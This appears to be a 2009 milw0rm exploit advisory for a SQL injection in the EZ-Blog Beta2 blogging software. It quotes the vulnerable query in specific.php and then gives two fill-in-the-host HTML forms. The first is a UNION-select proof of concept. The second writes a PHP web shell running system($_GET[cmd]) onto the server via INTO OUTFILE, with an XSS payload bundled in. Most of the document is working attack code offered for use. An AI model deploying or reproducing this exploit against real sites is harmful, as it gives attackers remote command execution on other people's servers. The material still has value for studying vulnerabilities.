<html><head><title>EZ-Blog Beta2 (category) Remote SQL Injection Vulnerability</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	    	  SQL INJECTION VULNERABILITY		             	     |
|--------------------------------------------------------------------------------------------|
|                         	| 	  EZ-blog Beta2        |		 	     |
|  CMS INFORMATION:		 ------------------------------			             |
|										             |
|--&gt;WEB: http://sourceforge.net/projects/ez-blog/          				     |
|--&gt;DOWNLOAD: http://sourceforge.net/projects/ez-blog/            	                     |
|--&gt;DEMO: N/A										     |
|--&gt;CATEGORY: CMS / Blogging								     |
|--&gt;DESCRIPTION: EZ-Blog is an open-source blog program written in PHP.       	             |
|		Presently, only MySQL is supported, but a PostgreSQL version is planned.     |
|--&gt;RELEASED: 2009-04-26								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3						                     |
|--&gt;DORK: N/A									             |
|--&gt;CATEGORY: SQL INJECTION (SHELL UPLOAD)					             |
|--&gt;AFFECT VERSION: &lt;=1 Beta2						 		     |
|--&gt;Discovered Bug date: 2009-04-26							     |
|--&gt;Reported Bug date: 2009-04-27							     |
|--&gt;Fixed bug date: Not fixed								     |
|--&gt;Info patch: Not fixed							             |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------


#########################
////////////////////////

SQL INJECTION (SQLi):

////////////////////////
#########################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++---------&gt;&gt;&gt;&gt;


-------
INTRO:
-------


An exploit was published by drosophila with Multiple SQL Injection in EZ-blog Beta-1, 
they've (apparently) fixed it but the system is still vulnerable.


Source: http://www.milw0rm.com/exploits/8128


-----------
FILE VULN:
-----------

Path --&gt; [HOME_PATH]/public/specific.php

...

$whichcategory = Trim($_POST['category']);

...
	if ($whichcategory=='All'){
		$query  = &quot;SELECT * FROM content ORDER BY id DESC&quot;;	
	}else{
		$query  = &quot;SELECT * FROM content WHERE  topic ='&quot; . $whichcategory . &quot;' ORDER BY id DESC&quot;;
	}	
	$result = mysql_query($query);
...


------------------
PROOF OF CONCEPT:
------------------

Copy and save --&gt; PoC.html.
Configure --&gt; HOST, HOME_PATH

&lt;html&gt;
&lt;title&gt;
PoC BY Y3NH4CK3R --PROUD TO BE SPANISH--&gt;
&lt;/title&gt;
&lt;h1&gt;
Click &quot;Execute PoC&quot; to launch the proof of concept (SQLi)...
&lt;/h1&gt;
&lt;body bgcolor=#000000 text=#ffffff&gt;
&lt;form method=&quot;post&quot; action=&quot;http:[HOST]/[HOME_PATH]/public/specific.php&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;category&quot; value=&quot;-1' union all select version(),version(),version(),version(),version(),version(),version(),version()/*&quot;&gt;
&lt;input name=&quot;submit&quot; value=&quot;Execute PoC&quot; type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2&gt;
&lt;font color=#ff0000&gt;
BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com
&lt;/font&gt;
&lt;/h2&gt;
&lt;/body&gt;
&lt;/html&gt;


------------------------
EXPLOIT (SHELL UPLOAD):
------------------------

This aplication hasn't admin authentication using DB, ie, admin panel uses .htaccess file. 
This is a complete exploit: SQL Injection --&gt; Shell Upload, and XSS...all in one ;)

Copy and save --&gt; exploit.html.
Configure --&gt; HOST, HOME_PATH and COMPLETE-PATH.


&lt;html&gt;
&lt;title&gt;
PoC BY Y3NH4CK3R --PROUD TO BE SPANISH--&gt;
&lt;/title&gt;
&lt;h1&gt;
Click &quot;Upload shell&quot; to launch the exploit (SQLi)...
&lt;/h1&gt;
&lt;body bgcolor=#000000 text=#ffffff&gt;
&lt;form method=&quot;post&quot; action=&quot;http://[HOST]/[HOME_PATH]/public/specific.php&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;category&quot; value=&quot;-1' union all select '&lt;HTML&gt;&lt;title&gt;SHELL BY --Y3NH4CK3R--&gt;&lt;/title&gt;&lt;body text=#ffffff bgcolor=#000000&gt;&lt;center&gt;&lt;h1&gt;','YOUR SHELL IS ON!&lt;br&gt;&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;','&lt;font color=#ff0000&gt;&lt;h2&gt;Get var (cmd) to execute comands. Enjoy it!&lt;/h2&gt;&lt;/font&gt;','&lt;script&gt;alert(String.fromCharCode(67,111,109,109,97,110,100,32,101,120,101,99,117,116,101,100,33))&lt;/script&gt;','&lt;h3&gt;Command Result:&lt;/h3&gt;','&lt;?php system($_GET[cmd]); ?&gt;','&lt;br&gt;&lt;br&gt;&lt;font color=#ff0000&gt;&lt;h3&gt;By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com&lt;/h3&gt;&lt;/font&gt;&lt;/body&gt;','&lt;/HTML&gt;' INTO OUTFILE '[COMPLETE-PATH]/public/shell.php'/*&quot;&gt;
&lt;input name=&quot;submit&quot; value=&quot;Upload shell&quot; type=&quot;submit&quot;&gt;
&lt;/form&gt;&lt;br&gt;
&lt;h3&gt;
Your shell in &quot;http://[HOST]/[HOME_PATH]/public/shell.php&quot;
&lt;/h3&gt;
&lt;br&gt;
&lt;h2&gt;
&lt;font color=#ff0000&gt;
BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com
&lt;/font&gt;
&lt;/h2&gt;
&lt;/body&gt;
&lt;/html&gt;


Your shell in --&gt; http://[HOST]/[HOME_PATH]/public/shell.php


&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!


#######################################################################
#######################################################################
##*******************************************************************##
## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##  GREETZ TO: drosophila, JosS and all SPANISH Hack3Rs community!   ##
##*******************************************************************##
#######################################################################
#######################################################################

# milw0rm.com [2009-04-27]</pre></html>